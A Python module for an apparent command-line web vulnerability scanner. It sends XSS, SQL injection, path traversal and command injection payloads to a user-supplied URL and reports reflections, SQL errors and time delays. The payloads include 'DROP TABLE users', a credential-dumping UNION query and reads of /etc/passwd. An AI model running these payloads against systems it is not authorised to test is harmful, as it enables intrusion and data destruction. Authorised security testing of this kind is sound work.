# modules/vulnerability.py
import requests
import time
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.columns import Columns
from core.utils import clear_console

console = Console()

def run_vulnerability_scan():
    clear_console()
    console.print(Panel.fit("[b] Web Vulnerability Scanner[/b]", 
                          style="#ff7675", padding=(1,2)))

    url = console.input("\n[bold]  Enter target URL (e.g., https://example.com): [/] ").strip()

    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
        console.print(f"[yellow]⚠  Using HTTP protocol - consider using HTTPS for security[/yellow]")

    common_params = ['q', 'id', 'name', 'search', 'user', 'cmd', 'file']
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }

    payloads = {
        "XSS": [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "javascript:alert(1)",
            "'\"><script>alert(1)</script>"
        ],
        "SQLi": [
            "' OR '1'='1'-- ",
            "' UNION SELECT null,username,password FROM users--",
            "1; DROP TABLE users--",
            "1' WAITFOR DELAY '0:0:10'--",
            "SLEEP(10)#"
        ],
        "Path Traversal": [
            "../../../../etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
            "....//....//etc/passwd",
            "%2e%2e%2fetc%2fpasswd"
        ],
        "Command Injection": [
            "; ls -la",
            "| dir",
            "&& cat /etc/passwd",
            "$(ping -c 1 127.0.0.1)",
            "|| nslookup example.com"
        ]
    }

    error_patterns = {
        "SQLi": [
            "SQL syntax",
            "mysql_fetch",
            "unclosed quotation mark",
            "ORA-00933",
            "Microsoft SQL Server",
            "PostgreSQL",
            "syntax error",
            "SQLite3",
            "Warning: mysqli",
            "PDOException"
        ],
        "XSS": [
            "<script>alert(1)</script>",
            "onerror=alert(1)",
            "javascript:alert(1)",
            "alert(1)"
        ]
    }

    try:
        test_response = requests.get(url, headers=headers, timeout=10)
        if test_response.status_code != 200:
            console.print(f"[bold yellow]⚠  Warning: Target returned status code {test_response.status_code}[/bold yellow]")

        report = Table(title=f"Vulnerability Report for {url}",
                     style="bright_white",
                     show_header=True,
                     header_style="bold #ff7675",
                     expand=True)
        report.add_column("Vulnerability")
        report.add_column("Payload")
        report.add_column("Status")
        report.add_column("Details")

        header_check = Table(title="Security Headers Check", show_lines=True)
        header_check.add_column("Header")
        header_check.add_column("Expected Value")
        header_check.add_column("Actual Value")
        header_check.add_column("Status")

        security_headers = {
            "X-XSS-Protection": "1; mode=block",
            "Content-Security-Policy": "default-src 'self'",
            "Strict-Transport-Security": "max-age=31536000",
            "X-Content-Type-Options": "nosniff",
            "X-Frame-Options": "DENY",
            "Referrer-Policy": "no-referrer"
        }

        for header, expected in security_headers.items():
            actual = test_response.headers.get(header, "Not Present")
            status = "[green]✓ Secure[/green]" if actual == expected else "[red]󰀦 Missing/Invalid[/red]"
            header_check.add_row(header, expected, actual, status)

        console.print(Panel.fit(header_check, title="Header Analysis", style="#ff7675", padding=(1,2)))

        with console.status("[bold]Scanning target...[/bold]", spinner="dots"):
            for vuln_type, vuln_payloads in payloads.items():
                for payload in vuln_payloads:
                    test_locations = []
                    
                    # Generate test locations for common parameters
                    for param in common_params:
                        test_locations.append(("GET", url, {param: payload}, None))
                        test_locations.append(("POST", url, {param: payload}, None))
                    
                    # Add cookie injection test
                    test_locations.append(("COOKIE", url, None, {"session": payload}))

                    for method, target_url, data, cookies in test_locations:
                        try:
                            start_time = time.time()
                            response = None
                            
                            if method == "GET":
                                response = requests.get(
                                    target_url,
                                    params=data,
                                    headers=headers,
                                    cookies=cookies,
                                    timeout=15
                                )
                            elif method == "POST":
                                response = requests.post(
                                    target_url,
                                    data=data,
                                    headers=headers,
                                    cookies=cookies,
                                    timeout=15
                                )
                            elif method == "COOKIE":
                                response = requests.get(
                                    target_url,
                                    headers=headers,
                                    cookies=cookies,
                                    timeout=15
                                )

                            elapsed_time = time.time() - start_time
                            vulnerable = False
                            details = []

                            # Time-based detection for SQLi
                            if vuln_type == "SQLi" and any(keyword in payload for keyword in ["WAITFOR DELAY", "SLEEP"]):
                                if elapsed_time > 9:
                                    details.append(f"Time-based delay detected ({elapsed_time:.2f}s)")
                                    vulnerable = True

                            # Error pattern detection
                            if response.status_code == 500 and vuln_type == "SQLi":
                                details.append("500 Error with SQL payload")
                                vulnerable = True
                                
                            if any(error in response.text for error in error_patterns.get(vuln_type, [])):
                                details.append("Error pattern detected")
                                vulnerable = True
                            
                            # Payload reflection checks
                            if payload in response.text:
                                details.append("Payload reflection detected")
                                vulnerable = True
                            
                            # Command injection detection
                            if vuln_type == "Command Injection" and ("root:" in response.text or "Directory of" in response.text):
                                details.append("Potential command output detected")
                                vulnerable = True

                            if vulnerable:
                                result = "[red]󰀦 Vulnerable[/red]"
                                payload_preview = f"{method}: {payload[:25]}..." if len(payload) > 25 else f"{method}: {payload}"
                                report.add_row(
                                    vuln_type,
                                    f"[bright_black]{payload_preview}[/]",
                                    result,
                                    "\n".join(details)
                                )
                        except requests.exceptions.RequestException as e:
                            console.print(f"[yellow]Request failed: {str(e)}[/yellow]")
                            continue
                        except Exception as e:
                            console.print(f"[red]Error during test: {str(e)}[/red]")
                            continue

        console.print(Panel.fit(report, title="Scan Results", style="#ff7675", padding=(1,2)))

        recommendations = [
            "[bold]Recommendations:[/bold]",
            "1. Implement Web Application Firewall (WAF)",
            "2. Validate and sanitize all user inputs",
            "3. Use parameterized queries for database access",
            "4. Implement Content Security Policy (CSP)",
            "5. Regular security updates and patching",
            "6. Use HTTPS with proper security headers",
            "7. Implement rate-limiting and request validation"
        ]
        console.print(Panel.fit("\n".join(recommendations), 
                      title="Security Recommendations", 
                      style="#74b9ff", 
                      padding=(1,2)))

    except Exception as e:
        console.print(f"[bold red]⨯  Critical error: {str(e)}[/bold red]")